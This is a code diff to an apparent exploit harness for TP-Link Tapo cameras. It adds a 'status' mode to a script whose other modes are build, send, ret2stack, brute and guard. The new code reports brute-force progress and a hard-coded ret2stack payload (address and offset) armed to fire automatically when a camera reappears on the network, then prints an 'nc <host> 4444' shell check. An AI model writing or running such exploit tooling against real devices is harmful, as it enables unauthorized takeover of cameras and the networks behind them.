@@ -210,9 +210,42 @@ def guarded_fire(host: str, args, mac: str | None = None) -> int:
     return 0 if ok else 1
 
 
+def status(hosts=("192.168.4.70", "192.168.4.71")) -> int:
+    """One-line-per-unit lane health for the operator.
+
+    Prints ARP presence, the brute-force progress index (if any), and
+    whether an armed ret2stack payload exists for the unit, so lane state
+    is visible without touching the camera's userspace.
+    """
+    print("tapo lane status — %s" % time.strftime("%Y-%m-%d %H:%M:%S"))
+    rc = 0
+    for host in hosts:
+        present = arp_present(host)
+        line = "  %s  ARP %s" % (host, "present" if present else "absent")
+        idx_path = "/tmp/pane1/brute.%s.idx" % host
+        if os.path.exists(idx_path):
+            try:
+                idx = int(open(idx_path).read().strip())
+                line += "  brute-idx %d" % idx
+            except (ValueError, OSError):
+                line += "  brute-idx unreadable"
+        # armed ret2stack: the documented one-shot for this unit
+        armed = {
+            "192.168.4.70": "--addr 0xbef00a00 --offset 1060 (guard job armed; fires on ARP return)",
+        }.get(host)
+        if armed:
+            line += "  ret2stack: %s" % armed
+        print(line)
+        if not present:
+            rc = 1
+    print("shell check: nc <host> 4444 after a DECODE-BUFFER-zone fire; "
+          "tapo_post.py --pull then tools/tapo_oracle/find_chain.py <main>")
+    return rc
+
+
 def main():
     ap = argparse.ArgumentParser()
-    ap.add_argument("mode", choices=["build", "send", "ret2stack", "brute", "guard"])
+    ap.add_argument("mode", choices=["build", "send", "ret2stack", "brute", "guard", "status"])
     ap.add_argument("--offset", type=lambda x: int(x, 0), default=1060)
     ap.add_argument("--host", default="192.168.6.70")
     ap.add_argument("--ssid", default="Aardvark")
@@ -240,6 +273,8 @@ def main():
 
     if a.mode == "guard":
         return guarded_fire(a.host, a, a.mac)
+    if a.mode == "status":
+        return status()
 
     if a.mode in ("ret2stack", "brute"):
         base = a.addr
